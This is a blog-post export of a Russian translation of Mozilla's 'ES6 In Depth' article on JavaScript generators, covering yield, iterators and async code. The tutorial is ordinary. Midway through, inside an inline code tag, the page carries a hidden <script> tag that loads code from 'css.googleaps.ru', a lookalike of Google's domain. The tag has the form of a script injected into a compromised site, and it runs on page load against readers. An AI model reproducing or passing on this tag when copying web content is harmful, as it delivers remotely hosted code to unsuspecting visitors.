---
layout: post
status: publish
published: true
title: 'ES6 в деталях: Генераторы'
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 1481
wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/es6-%d0%b2-%d0%b4%d0%b5%d1%82%d0%b0%d0%bb%d1%8f%d1%85-%d0%b3%d0%b5%d0%bd%d0%b5%d1%80%d0%b0%d1%82%d0%be%d1%80%d1%8b/
date: '2015-05-28 00:00:00 +0200'
date_gmt: '2015-05-28 00:00:00 +0200'
categories:
- Верстка
tags:
- ip
- spl
- javascript
- js
- ui
- api
- frontender
comments: []
---
<p><em><a href="https://hacks.mozilla.org/category/es6-in-depth/">ES6 в деталях</a> &mdash; это цикл статей о новых возможностях языка<br />
программирования JavaScript, появившихся в 6 редакции стандарта ECMAScript,<br />
кратко &mdash; ES6.</em></p>
<p>Мне не терпится вам всё рассказать. Сегодня мы будем обсуждать самую волшебную<br />
функциональность в ES6.</p>
<p>Что я имел в виду под словом &laquo;волшебную&raquo;? Во-первых, эта функциональность<br />
настолько отличается от всего того, что уже есть в JS, что поначалу может<br />
показаться колдовством. В том смысле, что она выворачивает обычное поведение<br />
языка наизнанку! Если это не магия, то я не знаю, что это.</p>
<p>Но не только поэтому. Возможности этой фичи по упрощению кода и устранению<br />
&laquo;ада колбеков&raquo; граничат со сверхъестественным.</p>
<p>Я излишне нахваливаю? Давайте углубимся, и вы сами рассудите.</p>
<h2>Знакомьтесь, генераторы ES6</h2><br />
Что такое генераторы?</p>
<p>Начнём с рассмотрения одного генератора:</p>
<pre><code>function* quips(name) {<br />
  yield "привет, " + name + "!";<br />
  yield "я надеюсь, вам нравятся статьи";<br />
  if (name.startsWith("X")) {<br />
    yield "как круто, что ваше имя начинается с X, " + name;<br />
  }<br />
  yield "увидимся!";<br />
}<br />
</code></pre><br />
Это часть кода для <a href="http://people.mozilla.org/~jorendorff/demos/meow.html">говорящей кошки</a>, возможно, самого важного вида<br />
приложений в интернете на сегодняшний день. (Давайте,<br />
<a href="http://people.mozilla.org/~jorendorff/demos/meow.html">нажмите на ссылку, поиграйте с кошкой</a>. Когда вы окончательно запутаетесь,<br />
возвращайтесь сюда за объяснением.)</p>
<p>Выглядит как-то похоже на функцию, верно? Это называется, <em>функция-генератор</em>,<br />
и у неё есть много общего с обычными функциями. Но вы можете заметить два<br />
отличия уже сейчас:</p>
<ul>
<li>Обычные функции начинаются с <code>function</code>. Функции-генераторы начинаются с<br />
<code>function*</code>.</li></p>
<li>Внутри функции-генератора есть ключевое слово <code>yield</code> с синтаксисом, похожим<br />
на <code>return</code>. Отличие в том, что функция (в том числе функция-генератор) может<br />
вернуть значение только один раз, но отдать значение функция-генератор может<br />
любое количество раз. Выражение <code>yield</code> <em>приостанавливает выполнение<br />
генератора, так что его можно позже возобновить</em>.</li><br />
</ul><br />
Вот, именно в этом самая большая разница между обычными функциями и<br />
функциями-генераторами. Обычные функции не могут поставить себя на паузу.<br />
Функции-генераторы могут.</p>
<h2>Что делают генераторы</h2><br />
Что произойдёт, если запустить функцию-генератор <code>quips()</code>?</p>
<pre><code>> var iter = quips("jorendorff");<br />
  [object Generator]<br />
> iter.next()<br />
  { value: "привет, jorendorff!", done: false }<br />
> iter.next()<br />
  { value: "я надеюсь, вам нравятся статьи", done: false }<br />
> iter.next()<br />
  { value: "увидимся!", done: false }<br />
> iter.next()<br />
  { value: undefined, done: true }<br />
</code></pre><br />
Возможно, вы очень привыкли к обычным функциям и тому, как они себя ведут.<br />
Когда их вызывают, они сразу же начинают выполняться и выполняются до тех пор,<br />
пока не вернут значение или не бросят исключение. Такое поведение само собой<br />
разумеется для любого JS-программиста.</p>
<p>Вызов генератора выглядит так же: <code>quips("jorendorff")</code>. Но после того, как вы<br />
вызовете генератор, он ещё не начнёт выполняться. Вместо этого он вернёт<br />
приостановленный <em>объект Generator</em> (в примере выше он под именем <code>iter</code>).<br />
Вы можете считать, что объект Generator &mdash; это вызов функции, замороженный во<br />
времени. Если точнее, он заморожен прямо в самом начале функции-генератора,<br />
перед первой строчкой кода.</p>
<p>Каждый раз, как вы вызываете метод <code>.next()</code> у объекта Generator, вызов функции<br />
оттаивает и выполняется, пока не достигнет следующего выражения <code>yield<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></code>.</p>
<p>Вот почему в примере выше после вызовов <code>iter.next()</code> мы всякий раз получали<br />
новое строковое значение. Эти значения производятся выражениями <code>yield</code> в теле<br />
<code>quips()</code>.</p>
<p>При последнем вызове <code>iter.next()</code> мы, наконец, достигли конца<br />
функции-генератора, так что поле <code>.done</code> результата стало равно <code>true</code>.<br />
Добраться до конца функции &mdash; это всё равно что вернуть <code>undefined</code>, и именно<br />
поэтому поле <code>.value</code> результата равно <code>undefined</code>.</p>
<p>Похоже, сейчас самое время вернуться к <a href="http://people.mozilla.org/~jorendorff/demos/meow.html">странице с говорящей кошкой</a> и<br />
как следует поиграться с кодом. Попробуйте добавить <code>yield</code> внутрь цикла.<br />
Что произойдёт?</p>
<p>Говоря техническим языком, каждый раз, когда генератор отдаёт значение, его<br />
<em>стековый кадр</em>: локальные переменные, аргументы, временные значения и текущая<br />
позиция точки выполнения внутри тела генератора&nbsp;&mdash; удаляется из стека.<br />
Однако, объект Generator хранит ссылку на этот стековый кадр (или его копию),<br />
так что последующий вызов <code>.next()</code> возобновит его и продолжит выполнение.</p>
<p>Стоит заметить, что <strong>генераторы не потоки выполнения</strong>. В языках с потоками<br />
различные куски кода могут выполняться одновременно, обычно приводя к состояниям<br />
гонки, недетерминированности и страстно желанному приросту производительности.<br />
Генераторы вообще на это не похожи. Когда генератор выполняется, он работает<br />
в том же потоке, что и код его вызвавший. Порядок выполнения последователен<br />
и строго определён, и нет никакой параллельности. В отличие от системных<br />
потоков, генератор останавливается только на тех местах, где в коде есть<br />
<code>yield</code>.</p>
<p>Хорошо. Теперь мы знаем, что такое, генераторы. Мы видели, как генераторы<br />
выполняются, приостанавливаются и возобновляют выполнение. Теперь хороший<br />
вопрос: как эти странные возможности могут нам пригодиться?</p>
<h2>Генераторы &mdash; итераторы</h2><br />
На прошлой неделе мы увидели, что в ES6 итераторы не просто один встроенный<br />
класс. Они &mdash; точка расширения языка. Вы можете создавать собственные итераторы,<br />
и для этого нужно лишь реализовать два метода: <code>[Symbol.iterator]()</code> и<br />
<code>.next()</code>.</p>
<p>Но реализация интерфейса &mdash; это всегда работа, по меньшей мере, небольшая.<br />
Взглянем, как реализация итератора выглядит на практике. В качестве примера<br />
возьмём простой итератор <code>range</code>, который всего-навсего считает от одного<br />
числа до другого, как в старомодном цикле <code>for (;;)</code> из C.</p>
<pre><code>// Должно "прозвенеть" трижды<br />
for (var value of range(0, 3)) {<br />
  alert("Динь! на этаже № " + value);<br />
}<br />
</code></pre><br />
Вот одно решение, с использованием класса ES6. (Если синтаксис <code>class</code> вам<br />
не до конца ясен, не волнуйтесь, мы разберём его в одной из будущих статей.)</p>
<pre><code>class RangeIterator {<br />
  constructor(start, stop) {<br />
    this.value = start;<br />
    this.stop = stop;<br />
  }</p>
<p>  [Symbol.iterator]() { return this; }</p>
<p>  next() {<br />
    var value = this.value;<br />
    if (value < this.stop) {<br />
      this.value++;<br />
      return {done: false, value: value};<br />
    } else {<br />
      return {done: true, value: undefined};<br />
    }<br />
  }<br />
}</p>
<p>// Возвращает новый итератор, который считает от 'start' до 'stop'.<br />
function range(start, stop) {<br />
  return new RangeIterator(start, stop);<br />
}<br />
</code></pre><br />
<a href="http://codepen.io/anon/pen/NqGgOQ">Посмотрите на код в действии.</a></p>
<p>Так реализация итератора выглядит в <a href="http://gafter.blogspot.com/2007/07/internal-versus-external-iterators.html">Java</a> или <a href="https://schani.wordpress.com/2014/06/06/generators-in-swift/">Swift</a>. Неплохо. Но<br />
вместе с тем и нетривиально. Есть ли ошибки в этом коде? Трудно сказать. Это<br />
выглядит совершенно непохоже на изначальный цикл <code>for (;;)</code>, который мы пытаемся<br />
эмулировать: протокол итераторов заставляет нас разобрать этот цикл на части.</p>
<p>В этом месте вы можете слегка охладеть к итераторам. Может, ими и здорово<br />
<em>пользоваться</em>, но вот реализовывать их трудно.</p>
<p>Вам, возможно, не пришло бы в голову предлагать добавить новую, пугающую и<br />
мозголомную структуру потока выполнения в язык JS просто чтобы стало легче<br />
писать итераторы. Но раз уж у нас <em>уже</em> есть генераторы, можем ли мы их тут<br />
применить? Давайте попробуем:</p>
<pre><code>function* range(start, stop) {<br />
  for (var i = start; i < stop; i++)<br />
    yield i;<br />
}<br />
</code></pre><br />
<a href="http://codepen.io/anon/pen/mJewga">Посмотрите на код в действии.</a></p>
<p>Вот этот генератор из 4 строчек полностью заменяет предыдущую 23-строчную<br />
реализацию <code>range()</code>, включая весь класс <code>RangeIterator</code> целиком.<br />
Это возможно потому что <strong>генераторы &mdash; это итераторы</strong>. У всех генераторов есть<br />
встроенная реализация <code>.next()</code> и <code>[Symbol.iterator]()</code>. Всё, что вам нужно &mdash;<br />
это описать поведение цикла.</p>
<p>Реализация итераторов без генераторов похожа на случай, когда нужно написать длинное<br />
электронное письмо используя только пассивный залог. Когда нельзя просто сказать<br />
то, что имеется в виду, речь в итоге получается весьма запутанной.<br />
<code>RangeIterator</code> длинный и странный потому что он должен описывать<br />
функциональность цикла не используя синтаксис циклов. Генераторы &mdash; ответ на это.</p>
<p>Для чего ещё можно применить возможность генераторов вести себя как итераторы?</p>
<ul>
<li><strong>Преобразование любого объекта в итерируемый.</strong> Просто напишите<br />
функцию-генератор, которая перебирает <code>this</code>, отдавая каждое значение по<br />
мере работы. Затем установите её объекту как метод <code>[Symbol.iterator]</code>.</li></p>
<li><strong>Упрощение функций, создающих массивы</strong>. Предположим, у вас есть функция,<br />
которая каждый раз при вызове возвращает массив, вроде такой:</p>
<pre><code>// Делим одномерный массив 'icons'<br />
// на массивы длиной 'rowLength'.<br />
function splitIntoRows(icons, rowLength) {<br />
  var rows = [];<br />
  var nRows = Math.ceil(icons.length / rowLength);<br />
  for (var i = 0; i < icons.length; i += rowLength) {<br />
    rows.push(icons.slice(i, i + rowLength));<br />
  }<br />
  return rows;<br />
}<br />
</code></pre><br />
Генераторы могут немного укоротить этот код:</p>
<pre><code>function* splitIntoRows(icons, rowLength) {<br />
  var nRows = Math.ceil(icons.length / rowLength);<br />
  for (var i = 0; i < icons.length; i += rowLength) {<br />
    yield icons.slice(i, i + rowLength);<br />
  }<br />
}<br />
</code></pre><br />
Единственная разница в поведении: вместо того, чтобы вычислять все<br />
результаты сразу и возвращать их в виде массива, мы возвращаем итератор, и<br />
результаты вычисляются по одному по мере необходимости.</li></p>
<li><strong>Результаты необычной длины.</strong> Вы не можете создать массив бесконечной<br />
длины. Но вы можете вернуть генератор, который генерирует бесконечную<br />
последовательность, и вызывающий код может взять оттуда сколько угодно<br />
значений.</li></p>
<li><strong>Рефакторинг сложных циклов.</strong> У вас есть огромная страшная функция?<br />
Вам хотелось бы разбить её на две более простые части? Генераторы &mdash; это<br />
новый нож в ваш набор инструментов для рефакторинга. Когда вы сталкиваетесь<br />
со сложным циклом, вы можете <em>вынести часть кода, производящего данные</em>,<br />
превращая его в отдельную функцию-генератор. А затем изменить цикл на,<br />
скажем, <code>for (var&nbsp;data of myNewGenerator(args))</code>.</li></p>
<li><strong>Утилиты для работы с итерируемыми объектами.</strong> ES6 <em>не</em> предоставляет<br />
обширную библиотеку для фильтрации, мэппинга или вообще каких-нибудь<br />
манипуляций с произвольными итерируемыми наборами данных. Но зато генераторы<br />
отлично подходят для написания любой утилиты, какая вам понадобится, всего<br />
в несколько строчек.</p>
<p>К примеру, предположим, вам нужен эквивалент <code>Array.prototype.filter</code>,<br />
работающий с <code>NodeList</code> из DOM, а не просто с массивами. Проще простого:</p>
<pre><code>function* filter(test, iterable) {<br />
  for (var item of iterable) {<br />
    if (test(item))<br />
      yield item;<br />
  }<br />
}<br />
</code></pre><br />
</li><br />
</ul><br />
Итак, генераторы полезны? Разумеется. Это удивительно лёгкий способ реализации<br />
собственных итераторов, а итераторы &mdash; это новый стандарт для данных и циклов<br />
во всём ES6.</p>
<p>Но это ещё не всё, что генераторы могут делать. Может даже выясниться, что это<br />
даже не самое важное из того, что они делают.</p>
<h2>Генераторы и асинхронный код</h2><br />
Вот такой код JS я писал раньше:</p>
<pre><code>          };<br />
        })<br />
      });<br />
    });<br />
  });<br />
});<br />
</code></pre><br />
Может быть, вы встретите что-то похожее в своём коде. <a href="http://www.html5rocks.com/en/tutorials/async/deferred/">Асинхронные APIs</a><br />
обычно требуют колбеков, поэтому приходится писать очередную анонимную<br />
функцию всякий раз, когда что-то делаешь. И если у вас есть кусок кода, который<br />
делает три вещи, вместо трёх строчек кода вы видите три <em>уровня отступов</em> кода.</p>
<p>Вот ещё кое-что из того JS-кода, что я писал:</p>
<pre><code>}).on('close', function () {<br />
  done(undefined, undefined);<br />
}).on('error', function (error) {<br />
  done(error);<br />
});<br />
</code></pre><br />
В асинхронных API используются соглашения об обработке ошибок вместо исключений.<br />
У разных API могут быть разные соглашения. В большинстве из них ошибки просто<br />
игнорируются по умолчанию. В некоторых из них игнорируется по умолчанию даже<br />
обычное успешное выполнение.</p>
<p>До нынешнего момента эти проблемы были необходимой платой за асинхронное<br />
программирование. Мы свыклись с тем, что асинхронный код просто не выглядит<br />
так же красиво и просто, как такой же синхронный.</p>
<p>Генераторы дают нам новую надежду, что это так не останется.</p>
<p><a href="https://github.com/kriskowal/q/tree/v1/examples/async-generators">Q.async()</a> &mdash; это экспериментальная попытка сделать асинхронный код похожим<br />
на синхронный при помощи генераторов и промисов. К примеру:</p>
<pre><code>// Синхронный код, производящий шум<br />
function makeNoise() {<br />
  shake();<br />
  rattle();<br />
  roll();<br />
}</p>
<p>// Асинхронный код, производящий шум<br />
// Возвращает объект Promise, который разрешится,<br />
// когда мы закончим шуметь<br />
function makeNoise_async() {<br />
  return Q.async(function* () {<br />
    yield shake_async();<br />
    yield rattle_async();<br />
    yield roll_async();<br />
  });<br />
}<br />
</code></pre><br />
Основное отличие в том, что в асинхронной версии нужно добавлять ключевое слово<br />
<code>yield</code> перед любым вызовом асинхронной функции.</p>
<p>Если добавить конструкции вроде <code>if</code> или <code>try</code>/<code>catch</code> в версию <code>Q.async</code>,<br />
то всё будет работать точно так же, как если бы их добавили в синхронный код.<br />
По сравнению с другими способами написания асинхронного кода этот меньше всего<br />
ощущается как изучение нового языка.</p>
<p>Если вы дочитали до этого места, возможно, вам понравится<br />
<a href="http://jlongster.com/A-Study-on-Solving-Callbacks-with-JavaScript-Generators">очень подробная статья по этой теме</a> от Джеймса Лонга (James Long).</p>
<p>Итак, генераторы освещают наш путь к новой модели асинхронного программирования,<br />
которая, кажется, лучше подходит для человеческого мозга.<br />
Эта работа ещё не окончена. Среди всего прочего, может помочь синтаксис получше.<br />
<a href="https://github.com/lukehoban/ecmascript-asyncawait">Предложение асинхронных функций</a>, работающих на промисах и генераторах и<br />
вдохновлённых похожими возможностями в C#, уже внесено<br />
в <a href="https://github.com/tc39/ecma262">таблицу на включение в ES7</a>.</p>
<h2>Когда можно воспользоваться этими безумными вещами?</h2><br />
На сервере вы можете применять генераторы уже сегодня в io.js (или в Node с<br />
параметром командной строки <code>--harmony</code>).</p>
<p>Из браузеров пока что генераторы поддерживают только Firefox 27+ и Chrome 39+.<br />
Чтобы применять генераторы в вебе, придётся воспользоваться <a href="http://babeljs.io/">Babel</a> или<br />
<a href="https://github.com/google/traceur-compiler#what-is-traceur">Traceur</a> и транслировать код ES6 в понятный всем браузерам ES5.</p>
<p>Ещё кое-что, что нельзя не упомянуть: Генераторы впервые были реализованы в JS<br />
Бренданом Айком (Brendan Eich), и его подход очень напоминал<br />
<a href="https://www.python.org/dev/peps/pep-0255/">генераторы в Python</a>, которые в свою очередь были вдохновлены <a href="http://www.cs.arizona.edu/icon/">Icon</a>.<br />
Они появились в Firefox <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/New_in_JavaScript/1.7">в далёком 2006</a>. Путь к стандартизации был<br />
непростым, синтаксис и поведение за это время немного поменялись.<br />
Генераторы ES6 были реализованы как в Firefox, так и в Chrome мастером<br />
компиляции <a href="http://wingolog.org/">Энди Винго (Andy Wingo)</a>. Его работа спонсировалась Bloomberg.</p>
<h2><code>yield;</code></h2><br />
О генераторах ещё можно многое рассказать. Мы не рассмотрели методы <code>.throw()</code><br />
и <code>.return()</code>, необязательные аргументы <code>.next()</code> и синтаксис выражения<br />
<code>yield*</code>.<br />
Но я считаю, что эта статья уже достаточно длинная, и из неё и так можно узнать<br />
много нового. Как и генераторы, мы пока приостановимся и закончим позднее.</p>
<p>Но на следующей неделе давайте немного сменим тему. Мы охватили две сложные темы<br />
подряд. Разве не было бы здорово в следующий раз поговорить о функциональности<br />
ES6, которая <em>не изменит</em> вашу жизнь? О чем-нибудь простом и очевидно полезном?<br />
О чём-то, что вызовет у вас улыбку? В ES6 и такое есть.</p>
<p>В следующей статье: фича, которая <em>прекрасно подойдёт</em> к любому коду, который вы<br />
пишете каждый день. Присоединяйтесь на следующей неделе и мы рассмотрим<br />
шаблоны строк в деталях.</p>
<p><img src="http://feeds.feedburner.com/~r/FrontenderMagazineArticles/~4/drWf8iTJcwE" alt="" width="1" height="1" /><br />
Source: http://frontender.info/</p>
